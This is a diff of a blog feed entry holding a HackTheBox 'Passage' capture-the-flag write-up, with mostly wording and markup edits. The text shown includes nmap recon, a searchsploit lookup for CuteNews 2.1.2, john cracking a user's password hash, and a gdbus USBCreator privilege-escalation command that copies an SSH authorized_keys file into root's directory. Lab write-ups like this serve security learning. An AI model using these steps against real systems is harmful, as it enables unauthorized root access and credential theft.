@@ -4,14 +4,14 @@
 &lt;a href="https://www.hackthebox.eu/home/machines/profile/275"&gt;Passage&lt;/a&gt; publish on
 September 2, 2020 by
 &lt;a href="https://www.hackthebox.eu/home/users/profile/140851"&gt;ChefByzen&lt;/a&gt;.
-This box is rated as a medium box. It implies two public exploit and a share SSH
+This box is rated as a medium box. It implies two public exploit and a shared SSH
 private key.&lt;/p&gt;
 </summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2021.03/passage_card.png" alt="Passage Card" width="262"&gt;&lt;/p&gt;
 &lt;p&gt;This box is a writeup about a retired HacktheBox machine:
 &lt;a href="https://www.hackthebox.eu/home/machines/profile/275"&gt;Passage&lt;/a&gt; publish on
 September 2, 2020 by
 &lt;a href="https://www.hackthebox.eu/home/users/profile/140851"&gt;ChefByzen&lt;/a&gt;.
-This box is rated as a medium box. It implies two public exploit and a share SSH
+This box is rated as a medium box. It implies two public exploit and a shared SSH
 private key.&lt;/p&gt;
 
 
@@ -19,7 +19,7 @@ private key.&lt;/p&gt;
 &lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
 &lt;p&gt;Let us start as always by a &lt;code&gt;nmap&lt;/code&gt; scan. Only port 80 (HTTP) and 22 (SSH) are
 open.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Sun Sep  12 03:46:59 2020 as: nmap -p- -sSV -oN nmap 10.10.10.206&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Sun Sep 13 03:46:59 2020 as: nmap -p- -sSV -oN nmap 10.10.10.206&lt;/span&gt;
 &lt;span class="code-line"&gt;Nmap scan report for 10.10.10.206&lt;/span&gt;
 &lt;span class="code-line"&gt;Host is up (0.086s latency).&lt;/span&gt;
 &lt;span class="code-line"&gt;Not shown: 65533 closed ports&lt;/span&gt;
@@ -32,13 +32,13 @@ open.&lt;/p&gt;
 &lt;h2 id="web"&gt;Web&lt;/h2&gt;
 &lt;p&gt;We browse to the website. This is a simple blog with some news. One of them is
 about a &lt;a href="https://www.fail2ban.org/wiki/index.php/Main_Page"&gt;fail2ban&lt;/a&gt;
-implementation. This will dissuade us to brute force login (which rarely happen on HTB) and run &lt;code&gt;dirb&lt;/code&gt; against
-the site.&lt;/p&gt;
+implementation. This will dissuade us to brute force login interfaces (which
+rarely happen on HTB) and run &lt;code&gt;dirb&lt;/code&gt; against the site.&lt;/p&gt;
 &lt;p&gt;&lt;img alt="Passage News index" src="/media/2021.03/passage_01.png"&gt;&lt;/p&gt;
 &lt;p&gt;When looking at the bottom of the page we see that the blog is "Powered by
 CuteNews". A few Google search lead us to the admin panel located at &lt;code&gt;/CuteNews&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img alt="Cute News login page" src="/media/2021.03/passage_02.png"&gt;&lt;/p&gt;
-&lt;p&gt;We can login (but we don't have any creds) or we can create an account.
+&lt;p&gt;We cannot login as we don't have any creds nor create an account.
 We also check the available exploit for this CuteNews version (2.1.2).&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$ searchsploit CuteNews 2.1.2&lt;/span&gt;
 &lt;span class="code-line"&gt;----------------------------------------------------------- ---------------------------------&lt;/span&gt;
@@ -65,19 +65,19 @@ encoded user data. Some of them contain a SHA256 hashed password.&lt;/p&gt;
 
 &lt;p&gt;We grab all the hashes and crack them using &lt;code&gt;john&lt;/code&gt; and the rockyou wordlist.
 &lt;code&gt;Paul&lt;/code&gt;'s password is &lt;code&gt;atlanta1&lt;/code&gt;.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;[maggick@fomalhaut ~]$ john hash -w=~/tools/password_lists/rockyou.txt --fork=8 --rules --format=Raw-SHA256&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="err"&gt;Using default input encoding: UTF-8&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="err"&gt;Loaded 4 password hashes with no different salts (Raw-SHA256 [SHA256 128/128 AVX 4x])&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="c"&gt;Warning: OpenMP was disabled due to --fork; a non-OpenMP build may be faster&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="err"&gt;Node numbers 1-8 of 8 (fork)&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="err"&gt;Each node loaded 1/8 of wordfile to memory (about 16 MB/node)&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="err"&gt;atlanta1         (paul)&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="err"&gt;Press &amp;#39;q&amp;#39; or Ctrl-C to abort, almost any other key for status&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="err"&gt;atlanta1         (paul)&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="err"&gt;atlanta1         (paul)&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="err"&gt;atlanta1         (paul)&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="err"&gt;Waiting for 7 children to terminate&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="err"&gt;Session completed&lt;/span&gt;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;[maggick@fomalhaut ~]$ john hash -w=~/tools/password_lists/rockyou.txt --fork=8 --rules --format=Raw-SHA256&lt;/span&gt;
+&lt;span class="code-line"&gt;Using default input encoding: UTF-8&lt;/span&gt;
+&lt;span class="code-line"&gt;Loaded 4 password hashes with no different salts (Raw-SHA256 [SHA256 128/128 AVX 4x])&lt;/span&gt;
+&lt;span class="code-line"&gt;Warning: OpenMP was disabled due to --fork; a non-OpenMP build may be faster&lt;/span&gt;
+&lt;span class="code-line"&gt;Node numbers 1-8 of 8 (fork)&lt;/span&gt;
+&lt;span class="code-line"&gt;Each node loaded 1/8 of wordfile to memory (about 16 MB/node)&lt;/span&gt;
+&lt;span class="code-line"&gt;atlanta1         (paul)&lt;/span&gt;
+&lt;span class="code-line"&gt;Press &amp;#39;q&amp;#39; or Ctrl-C to abort, almost any other key for status&lt;/span&gt;
+&lt;span class="code-line"&gt;atlanta1         (paul)&lt;/span&gt;
+&lt;span class="code-line"&gt;atlanta1         (paul)&lt;/span&gt;
+&lt;span class="code-line"&gt;atlanta1         (paul)&lt;/span&gt;
+&lt;span class="code-line"&gt;Waiting for 7 children to terminate&lt;/span&gt;
+&lt;span class="code-line"&gt;Session completed&lt;/span&gt;
 &lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;We open a shell, and try to switch user but we cannot use &lt;code&gt;su&lt;/code&gt; as we don't have
@@ -152,8 +152,9 @@ latest edited file is about USBCreator.&lt;/p&gt;
 &lt;span class="code-line"&gt;-&amp;#39;  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf&lt;/span&gt;
 &lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-&lt;p&gt;A quick Google search lead us a &lt;a href="https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/"&gt;blog post&lt;/a&gt; about how to write a file on the system as
-root. We reproduce the step in order to copy &lt;code&gt;nadav&lt;/code&gt;'s &lt;code&gt;authorized_keys&lt;/code&gt; file in
+&lt;p&gt;A quick Google search lead us a &lt;a href="https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/"&gt;blog post&lt;/a&gt;
+with an USBCreator privilege escalation exploit allowing to write a file on the system as
+root. We reproduce the steps in order to copy &lt;code&gt;nadav&lt;/code&gt;'s &lt;code&gt;authorized_keys&lt;/code&gt; file in
 the &lt;code&gt;root&lt;/code&gt;'s &lt;code&gt;.ssh&lt;/code&gt; directory. We can then connect as &lt;code&gt;root&lt;/code&gt; with our SSH key
 and get the flag.&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /home/nadav/.ssh/authorized_keys /root/.ssh/authorized_keys true&lt;/span&gt;
